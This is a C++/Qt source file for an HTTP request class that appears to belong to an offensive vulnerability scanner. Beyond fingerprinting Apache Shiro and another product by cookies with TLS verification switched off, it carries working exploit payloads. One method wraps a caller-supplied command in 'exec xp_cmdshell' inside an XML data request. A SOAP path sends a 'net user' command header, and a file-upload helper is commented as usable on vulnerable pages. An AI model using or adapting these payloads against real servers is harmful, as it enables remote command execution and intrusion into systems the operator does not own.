#include "httprequest.h"

Httprequest::Httprequest(void)
{

}


void Httprequest::request(QString requestUrl, int timeOut, QString requestMethod, QString contentType,QString ContentLength, QByteArray postQString,QString encoding, QString Disposttion,QString UserAgent,QString SOAPAction)
{

    QString Default_Encode="utf-8";
    if( encoding.isEmpty())
    {
        encoding=Default_Encode;
    }

    try
    {
        //下面设置qt ssl访问
     if(requestUrl.startsWith("https"))
     {
         QSslConfiguration conf=req.sslConfiguration();
         conf.setPeerVerifyMode(QSslSocket::VerifyNone);
         conf.setProtocol(QSsl::TlsV1SslV3);
         req.setSslConfiguration(conf);

    }
     req.setUrl(QUrl(requestUrl.toUtf8()));
     req.setHeader(QNetworkRequest::UserAgentHeader,QVariant("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0"));

      QSettings setting("config.ini",QSettings::IniFormat);
     setting.setIniCodec(QTextCodec::codecForName("utf-8"));

     dnslog = setting.value("/dnsPlatform/dnslog").toString();
      shiro=setting.value("/shirocheck/shiro").toString();

     qDebug()<<"HTTPrequest shiro"<<shiro;
     webcame=QString::fromUtf8(setting.value("webcame/webcamecheck").toByteArray());
       //获取内容后删除当前空间
     if(shiro=="true")
     {

         QList<QNetworkCookie> listCookie;
         listCookie.push_back(QNetworkCookie("rememberMe",QString("1").toUtf8()));
         QVariant var;
         var.setValue(listCookie);
         req.setHeader(QNetworkRequest::CookieHeader,var); //添加cookie，判断shiro
     }
     if(!contentType.isEmpty())
     {
         req.setHeader(QNetworkRequest::ContentTypeHeader,QVariant(contentType));

     }
     if(!SOAPAction.isEmpty())
     {
         req.setRawHeader("SOAPAction",SOAPAction.toUtf8());
         if(requestUrl.endsWith("/services%20/WorkflowServiceXml"))
         {
             req.setRawHeader("potats0","net user");
         }
     }
     if(!Disposttion.isEmpty())
     {
        req.setHeader(QNetworkRequest::ContentDispositionHeader,QVariant(Disposttion));
     }
     if(!ContentLength.isEmpty())
     {
        req.setHeader(QNetworkRequest::ContentLengthHeader, QVariant(ContentLength));
     }
     if(!UserAgent.isEmpty())
     {
         req.setHeader(QNetworkRequest::UserAgentHeader,QVariant(UserAgent));
     }
     if (!QUrl(requestUrl).isValid()) {
             qDebug()<<"url 不合法";
     }
     if(requestMethod=="GET")
     {
        manager->get(req);

     }else if(requestMethod=="POST")
     {
       manager->post(req,postQString);
     }

    }
    catch(QString exception)
    {
       QMessageBox::critical(NULL,"HTTP请求错误",exception,QMessageBox::Yes|QMessageBox::No,QMessageBox::Yes);
    }
    QTimer timer;
    timer.setInterval(10000);//设置超时10秒
    timer.setSingleShot(true);
    QEventLoop eventLoop;
    connect(manager,&QNetworkAccessManager::finished,this,&Httprequest::ReceiveReply);
    connect(&timer,&QTimer::timeout,&eventLoop,&QEventLoop::quit);
    connect(manager,&QNetworkAccessManager::finished,&eventLoop,&QEventLoop::quit);
    timer.start();
    eventLoop.exec(QEventLoop::ExcludeUserInputEvents);


}
    void Httprequest::ReceiveReply(QNetworkReply *reply_recv)
    {

        respons_data=reply_recv->readAll();
        status_code=reply_recv->attribute(QNetworkRequest::HttpStatusCodeAttribute).toInt();
        qDebug()<<"状态码为"<<status_code;
        if(shiro=="true")
        {

            qDebug()<<"shiro....recv";

           //qDebug()<<"status code:"<<reply->attribute(QNetworkRequest::HttpStatusCodeAttribute).toInt();
           //重定向
                   /*if (status_code == 301 || status_code == 302){
                         // Or the target URL if it was a redirect:
                         QVariant redirectionTargetUrl =reply->attribute(QNetworkRequest::RedirectionTargetAttribute);
                         //qDebug() << "redirection Url is " << redirectionTargetUrl.toString();
                         QUrl url(redirectionTargetUrl.toString());
                         manager->get(QNetworkRequest(url));
                   }*/
            QByteArray get_cookie("Set-Cookie");
           if(reply_recv->rawHeader(get_cookie).contains("rememberMe=deleteMe"))
           {
               shiro_result=true;
           }


        }
           if(webcame=="true")
           {

               QByteArray get_cookie("Set-Cookie");
               if(reply_recv->rawHeader(get_cookie).contains("ISMS_8700_Sessionname"))
               {
                   webcame_result=true;
               }
           }    

      if(reply_recv->error()!=QNetworkReply::NoError)
        {
             qDebug()<<"reply error:"<<reply_recv->errorString();
        }
      reply_recv->deleteLater();
      reply_recv=nullptr;
    }

 Httprequest::~Httprequest(void)
 {

     qDebug()<<"http 析构函数执行";
     delete manager;
     manager=nullptr;



 }

void  Httprequest::clear()
 {

 }
 void Httprequest::getHttpReuest(QString requestUrl,QString encoding)
 {
    Httprequest::request(requestUrl,Timeout,"GET",NULL,NULL,"",encoding,"",NULL,NULL);
 }
 void Httprequest::getHttpReuest(QString requestUrl,QString encoding,QString ContentType)
 {
    Httprequest::request(requestUrl,Timeout,"GET",ContentType,NULL,"",encoding,"",NULL,NULL);
 }
 void Httprequest::postHttpRequest(QString requestUrl,QString encoding,QString commod)
 {
    Httprequest::request(requestUrl, Timeout,"POST", "application/x-www-form-urlencoded",NULL,("cVer=9.8.0&dp=<?xml version=\"1.0\" encoding=\"GB2312\"?><R9PACKET version=\"1\"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format=\"text\">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format=\"text\">exec xp_cmdshell '"+commod+"'</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>").toUtf8(), encoding,"",NULL,NULL);
 }


 void Httprequest::postHttpRequest(QString requestUrl,QString encoding,QString contentType,QByteArray postdata)
 {
      Httprequest::request(requestUrl,Timeout,"POST",contentType,NULL,postdata,encoding,"",NULL,NULL);
 }




 void Httprequest::postfileHttpRequest(QString requestUrl, QString encoding,QString filename,QByteArray fileContent,QString file_mime)
 {

         QString sCrlf="\r\n";
         qsrand(QDateTime::currentDateTime().toTime_t());
         QString b=QVariant(qrand()).toString()+QVariant(qrand()).toString()+QVariant(qrand()).toString();
         QString sBoundary="---------------------------"+b;
         QString sEndBoundary=sCrlf+"--"+sBoundary+"--"+sCrlf;
         QString sContentType="multipart/form-data; boundary="+sBoundary;
         sBoundary="--"+sBoundary+sCrlf;
         QByteArray boundary=sBoundary.toLatin1();

         QByteArray sendData;

         sendData.append(boundary);
         sBoundary = sCrlf + sBoundary;
         boundary = sBoundary.toLatin1();
         sendData.append(QString("Content-Disposition: form-data; name=\""+upload_file+"\"; filename=\""+QString(filename.toUtf8().constData())+"\""+sCrlf).toLatin1());
         if(!file_mime.isEmpty())
         {
             sendData.append(QString("Content-Type: "+file_mime+sCrlf).toLatin1());
         }
         //sendData.append(QString("Content-Transfer-Encoding: 8bit"+sCrlf).toLatin1());
         sendData.append(sCrlf.toLatin1());
         sendData.append(fileContent);
         sendData.append(sEndBoundary.toLatin1());

          Httprequest::request(requestUrl,Timeout,"POST",sContentType,QString::number(sendData.size()),sendData,encoding,"",NULL,NULL);

 }
//https://my.oschina.net/chrisforbt/blog/483103   在漏洞页面利用此文件上传，只需要在
void Httprequest::post_soap_request(QString requestUrl, QString contentType,QString ContentLength, QByteArray postQString,QString encoding, QString UserAgent,QString SOAPAction)
{


    Httprequest::request(requestUrl,Timeout,"POST",contentType,NULL,postQString,encoding,NULL,UserAgent,SOAPAction);



}
